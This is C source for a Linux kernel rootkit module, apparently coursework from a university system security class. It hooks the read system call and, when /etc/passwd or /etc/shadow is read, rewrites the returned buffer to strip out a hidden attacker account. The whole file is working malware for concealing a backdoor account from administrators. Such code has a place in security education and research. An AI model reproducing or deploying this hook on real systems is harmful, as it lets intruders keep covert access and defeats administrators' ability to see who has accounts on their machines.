/**********************************************************
	Last Updated: Nov 16, 2014
	CSE509 System Security 2014 Fall @CS SBU
	Written By: 
		Hyungjoon Koo (hykoo@cs.stonybrook.edu)
		Yaohui Chen (yaohchen@cs.stonybrook.edu)

	Description: 
		Functions related to hijack a 'read' system call
***********************************************************/

#include "../headers/all.h"
#include "../headers/HJ_read.h"

EXPORT_SYMBOL(my_read);
extern asmlinkage long (*original_read)(unsigned int, char*, size_t);

asmlinkage long
my_read(unsigned int fd, char *buf, size_t count) {

	struct file *file, *tampered;

	u64 file_inode;
	//dev_t file_dev;
	//umode_t file_mode;
	//loff_t file_size;
	int r;
	
	char* file_name;
	char *ptr1, *ptr2, *ptr3;
	int i, buf_len_to_copy;
	//int tampered_fd;
	
	char* abs_path;
	char *tmp, *buf2;
	//loff_t pos, tampered_pos;
	
	struct kstat file_ksp;
	struct path file_path;
	//file_dev = file_ksp.dev;
	//file_mode = file_ksp.mode;
	//file_size = file_ksp.size;
	//mm_segment_t prev_fs;
	unsigned int ret;
	
	file = fget(fd);
	ret = (*original_read)(fd, buf, count);
	
	if (file) {
		// Get the file name and its inode
		file_name = file->f_path.dentry->d_name.name;
		r = vfs_stat(file_name, &file_ksp);
		file_inode = file_ksp.ino;
		
		// Get the absolute path of current file
		file_path = file->f_path;
		path_get(&file->f_path);
		tmp = (char *)__get_free_page(GFP_TEMPORARY);
		abs_path = d_path(&file_path, tmp, PAGE_SIZE);
		path_put(&file_path);
		free_page((unsigned long)tmp);
		
		// If the targeted file and some sanity checks
		if(ret && (strcmp(abs_path, passwd) == 0 || strcmp(abs_path, shadow) == 0) && strlen(buf) > 0) {
			
			//printk("[FD]: 0x%x, dev: 0x%x, mode: 0x%x, size: 0x%x\n", fd, file_dev, file_mode, file_size);
			
			// Allocate new buffer and copy string from user space
			buf2 = kmalloc(ret, GFP_KERNEL);
			copy_from_user(buf2, buf, ret);
			
			if (DEBUG == 1) {
				printk("READ: %s with inode %d\n", abs_path, file_inode);
				printk("[BufSize before manipulation]:0x%x\n", strlen(buf2));
			}
			
			/* 
				Do string manipulation to hide an attacker's account
				Set the three pointers, and leave out the target 
			*/
			ptr1 = buf2;
			ptr2 = strstr(buf2, hide_str);
			ptr3 = ptr2;
			while (*ptr3 != *delimiter)
				ptr3++;

			buf_len_to_copy = ptr1 + strlen(buf2) - ptr3;
			
			if (DEBUG == 1) {
				printk("buf_len_to_copy: %d\n", buf_len_to_copy);
				printk("Ptr1(Contents): %p, Ptr2(hide_str): %p, Ptr3(end hide_str): %p\n", ptr1, ptr2, ptr3);
			}
			
			ptr3++;
			for (i = 0; i < buf_len_to_copy; i++)
				*ptr2++ = *ptr3++;
			buf2[(void*)ptr2 - (void*)ptr1] = NULL;
			
			if (DEBUG == 1) 
				printk("[BufSize after manipulation]: 0x%x\n", strlen(buf2));
			
			/*
			// Get the current FS segment descriptor
			prev_fs = get_fs();
			// Set the segment descriptor in kernel
			set_fs(KERNEL_DS);
			
			tampered = filp_open(tmp_tampered, O_WRONLY|O_CREAT, 0644);
			
			vfs_write(tampered, buf, strlen(buf), &tampered->f_pos);
			filp_close(tampered, NULL);
			//tampered_fd = original_open(tampered, O_RDONLY, 0);
			
			// Reset the segment descriptor
			set_fs(prev_fs);
			
			tampered_pos = tampered->f_pos;
			ret = vfs_read(tampered, buf2, strlen(buf), &tampered->f_pos);
			tampered->f_pos = tampered_pos;
			fput(tampered);
			*/
			
			// Copy the altered string to user space
			copy_to_user(buf, buf2, ret);
			
			// ret = file->f_op->read(tampered, buf2, strlen(buf), ptr2);
			// printk("fd: %d VS tampered_fd: %d\n%s\n", fd, tampered_fd, buf);
			
			if (DEBUG == 1) {
				printk("!!!!! ------------------------ \n%s", buf);
				printk("\n!!!!! ------------------------ \n");
			}
			
			//ret = vfs_read(file, buf, count, &pos);
			kfree(buf2);
		}
	}
	
	return ret;
	//return original_read(fd, buf, count);
}